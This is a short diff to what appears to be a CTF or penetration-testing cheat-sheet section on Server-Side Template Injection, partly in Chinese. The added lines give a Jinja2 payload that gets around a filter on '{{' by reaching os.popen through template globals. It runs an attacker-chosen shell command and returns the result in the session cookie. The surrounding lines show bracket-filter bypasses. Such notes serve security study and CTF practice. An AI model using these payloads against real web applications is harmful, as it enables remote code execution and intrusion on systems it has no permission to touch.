@@ -2757,6 +2757,8 @@ Server-Side Template Injection
         {% endif %}
       {% endfor %}
       ```
+- Bypass blacklist `{{`
+  - `{% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&key=leader&command=whoami` => Result in cookie
 - 過濾中括號
     - `__getitem__`
     - `{{''.__class__.__mro__.__getitem__(2)}}`
